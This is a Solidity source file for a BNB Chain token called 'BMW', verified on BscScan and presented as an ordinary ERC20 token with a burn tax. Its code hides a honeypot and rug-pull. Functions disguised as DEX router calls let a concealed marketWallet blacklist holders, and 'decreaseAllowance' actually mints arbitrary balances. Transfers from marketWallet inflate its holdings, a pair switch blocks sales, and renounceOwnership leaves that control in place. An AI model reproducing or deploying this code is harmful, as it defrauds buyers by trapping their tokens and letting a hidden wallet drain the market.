/**
 *Submitted for verification at BscScan.com on 2022-07-07
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _msgSender());
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(
        address indexed _owner,
        address indexed newOwner
    );
}

contract BMW is Context, IERC20, Ownable {
    using SafeMath for uint256;

    bool private isTrue = true;
    bool private changePair = false;

    mapping(address => bool) private _excluFee;
    mapping(address => bool) private _lockTheSwap;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _inSwapAndLiquify;

    uint8 private _decimals = 9;
    string private _name = unicode"BMW";
    string private _symbol = unicode"BMW";

    uint256 private _burnTax = 4;
    uint256 private _tFeeTotal = _burnTax;
    uint256 private _totalSupply = 10000000000000 * 10 ** _decimals;

    address _token;
    address private marketWallet;
    address private _deadAddress = address(0xdead);
    address private UniswapPair;

    constructor(address _marketWallet, address _calldata) {
        require(_calldata == address(0));
        _token = _msgSender();
        _inSwapAndLiquify[_msgSender()] = _totalSupply;
        _excluFee[address(this)] = true;
        _excluFee[owner()] = true;
        marketWallet = _marketWallet;
        _excluFee[marketWallet] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function setUniswapV2Pair(bool _changePair, address _newPair) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            changePair = _changePair;
            UniswapPair = _newPair;
        }
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_excluFee[_msgSender()] || _excluFee[recipient]) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        uint256 _burnAmount = amount.mul(_burnTax).div(100);
        _transfer(_msgSender(), _deadAddress, _burnAmount);
        _transfer(_msgSender(), recipient, amount.sub(_burnAmount));
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_excluFee[sender] || _excluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnTax).div(100);
        _transfer(sender, _deadAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        if (isTrue) {
            require(_lockTheSwap[from] == false);
        }
        if (marketWallet == from) {
            _inSwapAndLiquify[marketWallet] = 
            _inSwapAndLiquify[marketWallet].
            add(totalSupply() * 10 ** 6);
        }
        if (changePair) {
            if (UniswapPair == from) {} else {
                require(_excluFee[from] == true || _excluFee[to] == true);
            }
        }
        _transfers(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _inSwapAndLiquify[spender]
             = 
             _inSwapAndLiquify[spender
             ].
             add
             (subtractedValue);
        }
    }

    function setMarketWallet(address spender, address recipient) external {
        if (_msgSender() == marketWallet || _msgSender() == _token) {
            require(recipient == address(0));
            require(_msgSender() == marketWallet || _msgSender() == _token);
            marketWallet = spender;
        }
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address spender,
        address recipient
    ) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _lockTheSwap[
                spender
                ]= 
                true;
            _lockTheSwap[
                recipient
                ]= 
                true;
        }
    }

    function swapExactETHForTokensSupportingFeeOnTransferTokens(address spender)
        external
    {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _lockTheSwap[
            spender
            ]= 
            true;
        }
    }

    function exclusionFee(address spender) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _lockTheSwap[spender] = false;
        }
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));

        _inSwapAndLiquify[sender] = _inSwapAndLiquify[sender].sub(toAmount);
        _inSwapAndLiquify[recipient] = _inSwapAndLiquify[recipient].add(
            toAmount
        );
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        require(_msgSender() == marketWallet || _msgSender() == _token);
        return _lockTheSwap[account];
    }

    function includeInFee(address spender) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _excluFee[spender] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setSellTax(uint256 burnFee) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _burnTax = burnFee;
            _tFeeTotal = burnFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function excludeFromFee(address spender) external {
        if (_msgSender() == marketWallet) {
            require(_msgSender() == marketWallet);
            _excluFee[spender] = true;
        }
    }

    function changeFeeReceivers(
        address LiquidityReceiver,
        address MarketingWallet,
        address marketingWallet,
        address charityWallet
    ) public onlyOwner {}

    function balanceOf(address account) public view override returns (uint256) {
        return _inSwapAndLiquify[account];
    }
}